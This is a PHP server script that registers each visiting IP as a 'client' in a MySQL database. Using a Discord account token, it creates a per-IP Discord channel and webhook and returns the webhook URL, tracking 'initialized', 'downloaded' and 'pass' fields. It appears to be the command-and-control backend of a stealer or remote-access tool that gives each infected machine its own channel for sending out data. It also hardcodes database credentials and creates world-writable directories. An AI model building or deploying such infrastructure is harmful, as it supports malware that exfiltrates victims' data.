<?php 
    if (!file_exists("/home/ojjptnew/public_html/profiles/" . $_SERVER['REMOTE_ADDR'])) {
        mkdir("/home/ojjptnew/public_html/profiles/" . $_SERVER['REMOTE_ADDR'], 0777, true);
    }
    
    $token = "Put Your Discord Account Token Here";
    $guild_id = "Put Your Guild Token ID Here";
    $category_id = "Put Your Category ID Here";

    $conn = mysqli_connect("localhost", "ojjptnew_admin", "88overflow88", "ojjptnew_clients");
    if (mysqli_connect_errno()) {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
      exit();
    }

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $sql = "SELECT * FROM clients WHERE ip='{$_SERVER['REMOTE_ADDR']}'";
        $res = $conn->query($sql);
        $row = $res->fetch_row(); 
        $exists = (bool)$row; 
        if ($exists == 1) {
            echo $row[1];
            exit();
        }

        $name = $_SERVER['REMOTE_ADDR'];
        $name = str_replace(".", "-", $name);
        
        $json_data = json_encode([
                "name" => $name,
                "parent_id" => $category_id,
                "permission_overwrites" => [],
                "type" => "0",
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/v8/guilds/" . $guild_id . "/channels");
        
        $headers = [
            "authorization: " . $token,
            "accept: /",
            "authority: discordapp.com",
            "content-type: application/json",
        ];
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        
        $result = curl_exec($ch);
        echo $result;
        $result = json_decode($result, true);

        $json_data = json_encode([
            "name" => "Client",
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/v8/channels/" . $result['id'] . "/webhooks");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        
        $response = curl_exec($ch);
        $response = json_decode($response, true);
        
        if ($response['token']) {
            $webhook = "https://discord.com/api/webhooks/" . $response['id'] . "/". $response['token'];
            echo $webhook;
            
            $sql = "INSERT INTO clients (ip, webhook, initialized, downloaded, pass) VALUES ('{$_SERVER['REMOTE_ADDR']}', '$webhook', 0, 0, '')";
            $query = $conn->query($sql);
            
            mysqli_error($conn);
        }
        else {
            echo "Failed to create channel";
        }
    }
    else {
        $sql = "SELECT webhook FROM clients WHERE ip='{$_SERVER['REMOTE_ADDR']}'";
        $res = $conn->query($sql);
        if ($res) {
            $row = $res->fetch_row();
            echo $row[0];
        }
    }
?>